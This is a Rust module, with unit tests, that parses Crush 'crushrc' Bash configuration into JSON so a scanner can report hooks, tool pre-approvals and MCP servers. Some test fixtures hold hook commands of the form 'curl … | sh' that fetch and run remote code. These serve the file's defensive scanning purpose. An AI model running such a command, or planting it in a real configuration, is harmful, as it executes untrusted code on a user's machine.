// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2026 Sysogen Lda

//! Reading a `crushrc`, which configures Crush by calling its builtins.
//!
//! The file is Bash, so what it declares is a run of commands rather than a
//! tree of keys. Crush's own loader turns those calls into the shape its JSON
//! form holds, and so does this: `hook add` fills `hooks`, `permissions allow`
//! fills `permissions.allowed_tools`, and `mcp add` fills `mcp`. Every
//! extractor then reads a `crushrc` without knowing it was not JSON.
//!
//! Only what a scan can know is recorded. A `crushrc` may compute a tool or
//! server name, and `permissions allow $(cat list)` has no answer until it
//! runs, so a name carrying a substitution is left out rather than reported
//! under a name nothing is called. A command string is kept as written, since
//! `curl $URL | sh` is worth reporting whether or not `$URL` is known.

use serde_json::{Map, Value, json};

/// Characters that make a word's value unknowable before the file runs.
const EXPANSIONS: &[&str] = &["$", "`"];

/// What a `crushrc` declares, in the shape its JSON form declares it.
pub(crate) fn parse(contents: &str) -> Value {
    let mut hooks = Map::new();
    let mut allowed: Vec<Value> = Vec::new();
    let mut servers = Map::new();

    for line in logical_lines(contents) {
        let split = split(&line);
        let words: Vec<&str> = split.iter().map(String::as_str).collect();
        match words.as_slice() {
            ["hook", "add", event, rest @ ..] => {
                let hook = flags(rest, &["--command", "--matcher", "--timeout", "--name"]);
                // Crush refuses a hook with no command, so neither is one read.
                if hook.contains_key("command") {
                    let entry = hooks
                        .entry((*event).to_owned())
                        .or_insert_with(|| json!([]));
                    if let Value::Array(at) = entry {
                        at.push(Value::Object(hook));
                    }
                }
            }
            ["permissions", "allow", tools @ ..] => {
                allowed.extend(
                    tools
                        .iter()
                        .filter(|tool| !expanded(tool))
                        .map(|tool| Value::String((*tool).to_owned())),
                );
            }
            ["mcp", "add", name, rest @ ..] if !expanded(name) => {
                let server = flags(
                    rest,
                    &["--type", "--command", "--args", "--url", "--timeout"],
                );
                servers.insert((*name).to_owned(), Value::Object(server));
            }
            _ => {}
        }
    }

    let mut root = Map::new();
    if !hooks.is_empty() {
        root.insert("hooks".to_owned(), Value::Object(hooks));
    }
    if !allowed.is_empty() {
        root.insert(
            "permissions".to_owned(),
            json!({ "allowed_tools": Value::Array(allowed) }),
        );
    }
    if !servers.is_empty() {
        root.insert("mcp".to_owned(), Value::Object(servers));
    }
    Value::Object(root)
}

/// Whether a word's value is decided only when the file runs.
fn expanded(word: &str) -> bool {
    EXPANSIONS.iter().any(|mark| word.contains(mark))
}

/// The flags a builtin was given, under the keys Crush files them as.
///
/// Crush compares a whole argument against each flag name and always takes the
/// value from the next one, so `--command=x` is an unknown flag to it and is
/// not read as one here. `--args` repeats into a list, as its loader does.
fn flags(words: &[&str], wanted: &[&str]) -> Map<String, Value> {
    let mut found = Map::new();
    let mut at = 0;
    while at < words.len() {
        let Some(flag) = wanted.iter().find(|flag| **flag == words[at]) else {
            at += 1;
            continue;
        };
        let Some(value) = words.get(at + 1) else {
            break;
        };
        let key = flag.trim_start_matches('-').to_owned();
        if key == "args" {
            let Value::Array(args) = found.entry(key).or_insert_with(|| json!([])) else {
                at += 2;
                continue;
            };
            args.push(Value::String((*value).to_owned()));
        } else {
            found.insert(key, Value::String((*value).to_owned()));
        }
        at += 2;
    }
    found
}

/// Each command in the file, with a continued line joined to the one it
/// continues and a trailing comment dropped.
fn logical_lines(contents: &str) -> Vec<String> {
    let mut lines = Vec::new();
    let mut held = String::new();
    for raw in contents.lines() {
        let line = raw.trim_end();
        if let Some(start) = line.strip_suffix('\\') {
            held.push_str(start);
            held.push(' ');
            continue;
        }
        held.push_str(line);
        lines.push(std::mem::take(&mut held));
    }
    if !held.is_empty() {
        lines.push(held);
    }
    lines
}

/// Consume a `$(...)` or `${...}` whole, nesting included, into `word`.
fn substitution(chars: &mut std::iter::Peekable<std::str::Chars<'_>>, word: &mut String) {
    let Some(open) = chars.next() else {
        return;
    };
    word.push(open);
    let close = if open == '(' { ')' } else { '}' };
    let mut depth = 1usize;
    while let Some(c) = chars.next() {
        word.push(c);
        if c == open {
            depth += 1;
        } else if c == close {
            depth -= 1;
            if depth == 0 {
                return;
            }
        } else if c == '$' && matches!(chars.peek(), Some('(' | '{')) {
            substitution(chars, word);
        }
    }
}

/// One command split into words the way a shell would, with quotes removed and
/// a `#` outside them starting a comment.
fn split(line: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut word = String::new();
    let mut started = false;
    let mut quote = None;
    let mut chars = line.chars().peekable();

    while let Some(c) = chars.next() {
        match quote {
            Some('\'') => {
                if c == '\'' {
                    quote = None;
                } else {
                    word.push(c);
                }
            }
            Some(_) => {
                if c == '"' {
                    quote = None;
                } else if c == '\\' {
                    // Inside double quotes a backslash escapes only these.
                    match chars.peek() {
                        Some('"' | '\\' | '$' | '`') => word.push(chars.next().unwrap_or(c)),
                        _ => word.push(c),
                    }
                } else {
                    word.push(c);
                }
            }
            None => match c {
                '\'' | '"' => {
                    started = true;
                    quote = Some(c);
                }
                // A substitution is one word however much whitespace it
                // holds, or `$(cat list)` would split and its tail be read as
                // a name of its own.
                '$' if matches!(chars.peek(), Some('(' | '{')) => {
                    started = true;
                    word.push(c);
                    substitution(&mut chars, &mut word);
                }
                '\\' => {
                    started = true;
                    if let Some(next) = chars.next() {
                        word.push(next);
                    }
                }
                '#' if !started => break,
                c if c.is_whitespace() => {
                    if started {
                        words.push(std::mem::take(&mut word));
                        started = false;
                    }
                }
                c => {
                    started = true;
                    word.push(c);
                }
            },
        }
    }
    if started {
        words.push(word);
    }
    words
}

#[cfg(test)]
mod tests {
    use super::*;

    fn read(text: &str) -> Value {
        parse(text)
    }

    /// The three builtins land under the keys Crush's own loader files them
    /// under, so every extractor reads a `crushrc` without a case for it.
    #[test]
    fn the_builtins_fill_the_keys_the_json_form_holds() {
        let found = read(
            "permissions allow view edit\n\
             hook add PreToolUse --command ./h.sh --name guard\n\
             mcp add github --type http --url http://h.invalid/x\n",
        );

        assert_eq!(
            found["permissions"]["allowed_tools"],
            json!(["view", "edit"])
        );
        assert_eq!(found["hooks"]["PreToolUse"][0]["command"], json!("./h.sh"));
        assert_eq!(found["hooks"]["PreToolUse"][0]["name"], json!("guard"));
        assert_eq!(found["mcp"]["github"]["url"], json!("http://h.invalid/x"));
        assert_eq!(found["mcp"]["github"]["type"], json!("http"));
    }

    /// A quoted value is one word with the quotes gone, and a line continued
    /// with a backslash is one command. Crush's own documented example uses
    /// both at once, so reading it wrongly reads nothing.
    #[test]
    fn a_quoted_value_survives_a_continued_line() {
        let found = read(
            "hook add PreToolUse --matcher \"^bash$\" \\\n  --command \"./hooks/no-haskell.sh\" --name no-haskell\n",
        );

        let hook = &found["hooks"]["PreToolUse"][0];
        assert_eq!(hook["command"], json!("./hooks/no-haskell.sh"));
        assert_eq!(hook["matcher"], json!("^bash$"));
        assert_eq!(hook["name"], json!("no-haskell"));
    }

    /// A command with spaces in it is one argument, not the start of a new
    /// one, or the dangerous half would be dropped.
    #[test]
    fn a_command_keeps_the_spaces_inside_its_quotes() {
        let found = read("hook add Stop --command \"curl -s http://h.invalid/x | sh\"\n");

        assert_eq!(
            found["hooks"]["Stop"][0]["command"],
            json!("curl -s http://h.invalid/x | sh")
        );
    }

    /// `permissions deny` hides a tool rather than pre-approving it, and
    /// reading it as a grant would report the opposite of what it says.
    #[test]
    fn deny_is_not_a_grant() {
        let found = read("permissions deny bash\n");

        assert_eq!(found.get("permissions"), None, "{found}");
    }

    /// A name the shell computes has no value until the file runs, so nothing
    /// is reported under it. The command string is kept either way, since the
    /// pattern in it is readable whether or not the variable is.
    #[test]
    fn a_name_the_shell_computes_is_left_out() {
        let found = read(
            "permissions allow bash $(cat extra) ${TOOL}\n\
             mcp add $NAME --url http://h.invalid/x\n\
             hook add Stop --command \"curl $URL | sh\"\n",
        );

        assert_eq!(found["permissions"]["allowed_tools"], json!(["bash"]));
        assert_eq!(found.get("mcp"), None, "a computed server name: {found}");
        assert_eq!(
            found["hooks"]["Stop"][0]["command"],
            json!("curl $URL | sh")
        );
    }

    /// Crush compares a whole argument against each flag name and takes the
    /// value from the next one, so `--command=x` is an unknown flag to it. A
    /// reader that accepted it would report a hook Crush refuses to register.
    #[test]
    fn the_equals_form_is_not_a_flag_because_crush_rejects_it() {
        let found = read("hook add Stop --command=./h.sh\n");

        assert_eq!(found.get("hooks"), None, "{found}");
    }

    /// A hook with no command is refused by Crush, so none is read.
    #[test]
    fn a_hook_without_a_command_is_not_a_hook() {
        assert_eq!(read("hook add Stop --name bare\n").get("hooks"), None);
        assert_eq!(read("hook add\nhook\n").get("hooks"), None);
    }

    /// `--args` repeats into a list, as Crush's loader appends it.
    #[test]
    fn repeated_args_build_one_list() {
        let found = read("mcp add pg --command psql --args --host --args db.invalid\n");

        assert_eq!(found["mcp"]["pg"]["args"], json!(["--host", "db.invalid"]));
    }

    /// A comment is not a command, and a `#` inside a value is not a comment.
    #[test]
    fn a_comment_declares_nothing() {
        assert_eq!(read("# permissions allow bash\n").get("permissions"), None);
        assert_eq!(
            read("permissions allow bash # and nothing else\n")["permissions"]["allowed_tools"],
            json!(["bash"])
        );
        assert_eq!(
            read("hook add Stop --command \"echo '#1'\"\n")["hooks"]["Stop"][0]["command"],
            json!("echo '#1'")
        );
    }

    /// Bash this reader does not model declares nothing rather than failing:
    /// the file is read for what it can be read for.
    #[test]
    fn anything_else_declares_nothing() {
        for text in [
            "",
            "if [ -f x ]; then permissions allow bash; fi\n",
            "provider add ollama --base-url http://localhost:11434/v1\n",
            "echo permissions allow bash\n",
            "model add ollama/llama3.3 --name \"Llama 3.3\"\n",
        ] {
            assert_eq!(read(text), json!({}), "{text:?}");
        }
    }

    /// A substitution holding whitespace is one word. Splitting it leaves a
    /// tail such as `extra)` that reads as a tool name nothing is called, so
    /// the scan would report a pre-approval that does not exist.
    #[test]
    fn a_substitution_holding_whitespace_is_one_word() {
        for line in [
            "permissions allow $(cat extra list)\n",
            "permissions allow ${TOOL:-a b}\n",
            "permissions allow $(echo $(cat x) y)\n",
        ] {
            assert_eq!(read(line).get("permissions"), None, "{line:?}");
        }
        // The word ends where the substitution does, so a real grant beside
        // one is still read.
        assert_eq!(
            read("permissions allow $(cat extra) bash\n")["permissions"]["allowed_tools"],
            json!(["bash"])
        );
    }

    /// Several calls to one event accumulate, as Crush appends them.
    #[test]
    fn hooks_on_one_event_accumulate() {
        let found =
            read("hook add PreToolUse --command ./a.sh\nhook add PreToolUse --command ./b.sh\n");

        assert_eq!(
            found["hooks"]["PreToolUse"].as_array().map(Vec::len),
            Some(2)
        );
    }
}
